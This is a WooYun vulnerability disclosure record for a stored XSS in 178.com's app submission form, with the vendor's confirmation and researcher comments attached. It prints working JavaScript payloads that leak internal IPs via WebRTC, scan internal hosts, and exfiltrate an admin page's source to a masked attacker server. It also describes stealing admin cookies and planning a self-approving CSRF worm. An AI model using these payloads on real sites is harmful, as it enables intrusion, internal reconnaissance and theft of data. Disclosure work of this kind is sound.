{"id": 44897, "wybug_id": "wooyun-2015-098031", "wybug_title": "通过一个存储XSS探测178内网", "wybug_corp": "178游戏网", "wybug_author": "bey0nd", "wybug_date": "2015-02-22 23:17", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： 通过一个存储XSS探测178内网  附payload 详细说明：  站点：http://apt.178.com/在添加app应用或者铃声资源的时候，没有对输入进行过滤。如下\n\n上传之后需要等管理员审核后才会在前台显示出。那就可以盲打管理了。成功收到cookie等信息，好激动\n\n但是后台却做了限制\n\n好吧。就这样结束总感觉不太好。然后就想用xss做一些其他的事。。首先来获取内网ip吧借鉴了0x_jin牛的payload，然后本地随手改了一下，放在某渣渣xss平台。xss平台可以用的payload为福利：\nvar RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;if (RTCPeerConnection)(function() {    var rtc = new RTCPeerConnection({        iceServers: []    });    if (window.mozRTCPeerConnection) {        rtc.createDataChannel('', {            reliable: false        });    };    rtc.onicecandidate = function(evt) {        if (evt.candidate) grepSDP(evt.candidate.candidate);    };    rtc.createOffer(function(offerDesc) {        grepSDP(offerDesc.sdp);        rtc.setLocalDescription(offerDesc);    }, function(e) {        console.warn(\"offer failed\", e);    });    var addrs = Object.create(null);    addrs[\"0.0.0.0\"] = false;    function updateDisplay(newAddr) {        if (newAddr in addrs) return;        else addrs[newAddr] = true;        var displayAddrs = Object.keys(addrs).filter(function(k) {            return addrs[k];        });        var address = displayAddrs.join(\" or perhaps \") || \"n/a\";        sendip(address);    }    function grepSDP(sdp) {        var hosts = [];        sdp.split('\\r\\n').forEach(function(line) {            if (~line.indexOf(\"a=candidate\")) {                var parts = line.split(' '),                    addr = parts[4],                    type = parts[7];                if (type === 'host') updateDisplay(addr);            } else if (~line.indexOf(\"c=\")) {                var parts = line.split(' '),                    addr = parts[2];                updateDisplay(addr);            }        });    }})();function sendip(ipaddress) {    alert(ipaddress);    var url = \"http://*****.com/index.php?do=api&id={projectId}&address=\" + ipaddress;    var xmlhttp1 = new XMLHttpRequest();    xmlhttp1.open(\"GET\", url, true);    xmlhttp1.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");    xmlhttp1.send(null);}\n然后成功获取到内网的ip信息\n\n当前ip：192.168.1.111然后就想探测一下该内网段中存活的主机。在本地测试了一下，如果直接获取1~255的话浏览器略卡。怕被发现就探测110~130之间了。payload：\nfunction ipsend(ip, netport) {    var ipdata = ip + \":\" + netport;    var url = \"http://*****.sinaapp.com/insert.php?ip=\" + ipdata;    var xmlhttp1 = new XMLHttpRequest();    xmlhttp1.open(\"GET\", url, true);    xmlhttp1.send(null);}function ipCreate(ip) {    var ips = ip.replace(/(\\d+\\.\\d+\\.\\d+)\\.\\d+/, '$1.');    for (var i = 100; i <= 130; i++) {       //探测110~130之间        ElementCreate(ips + i, \"80\", i);        ElementCreate(ips + i, \"8080\", i);    }}function ElementCreate(ip, xport, i) {    var url = \"http://\" + ip + \":\" + xport;    var scriptElement = document.createElement(\"script\");    scriptElement.src = url;    scriptElement.setAttribute(\"onload\", \"ipsend(\\'\" + ip + \"\\',\\'\" + xport + \"\\')\");    document.body.appendChild(scriptElement);}ipCreate(\"192.168.1.100\");\n我把获取到的内网ip和端口发送到我的新浪云sae上了。\n\n到这里以后感觉这个内网中好像并没有开发的信息，好像只是负责后台的审核既然内网这条路不好走，为了响应大乌云的号召。http://zone.wooyun.org/content/18421所以考虑换个方式。想通过xss获取审核页面的源代码信息，然后提取出审核通过的请求链接。然后在通过一次xss来csrf劫持管理员，在管理打开审核页面的时候，自动发起请求让我提交的应用自动通过，从而达到蠕动到前台来扩大影响。走起首先获取http://apt.178.com/console/deb的源代码payload\nConnection(\"console/deb\");function Connection(url) {    var xmlhttp = new XMLHttpRequest();    xmlhttp.onreadystatechange = function() {        DataSend('a', 'filename getresponse code is : ' + encodeURIComponent(xmlhttp.status));        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {            DataSend(encodeURIComponent(url), encodeURIComponent(xmlhttp.responseText));        }    }    xmlhttp.open(\"GET\", url, true);    xmlhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");    xmlhttp.send();}function DataSend(fileurl, FileData) {    var url = \"http://*****.sinaapp.com/insert.php?ip=\" + FileData;    var xmlhttp1 = new XMLHttpRequest();    xmlhttp1.open(\"POST\", url, true);    xmlhttp1.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");    xmlhttp1.send(\"ip=\" + FileData);}\n获取到的信息同样的自动请求我的服务端http://*****.sinaapp.com/insert.php来存储在js中发起两次请求，首先存储http 状态码，其次内容\n\n200.请求成功但是奇怪的是虽然状态码来了，但是内容却没来。这就让我费解了。服务端数据库中也没有耽误好久，然后在服务器日志中查到该源码信息\n\n但是并不完整前前后后花了好几天，包括写payload和等待后台管理员审核。再加上sae这环境。累尿了就不在向下xss了好了，故事讲完了。   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 bey0nd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-02-25 09:56 厂商回复： 谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-22 23:21 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  沙发    \n     2015-02-23 10:54 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  你这是最近网好了...    \n     2015-03-02 19:58 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:832 漏洞数:113        | 相濡以沫，不如相忘于江湖)\t\t \n  你这是最近网好了...     \n     2015-03-31 00:49 |    \t\tM4ster \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:7        | www.m4ster@gmail.com)\t\t \n  为何不直接上BeEF？而且GET请求只能传递2kb数据，下次获取源码用POST吧。    \n     2015-06-12 09:09 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @M4ster 啥BeEF？不过这个获取源码肯定还是post好，get有长度限制的    \n     2015-06-12 14:33 |    \t\tM4ster \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:7        | www.m4ster@gmail.com)\t\t \n  @px1624 https://github.com/beefproject/beef    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}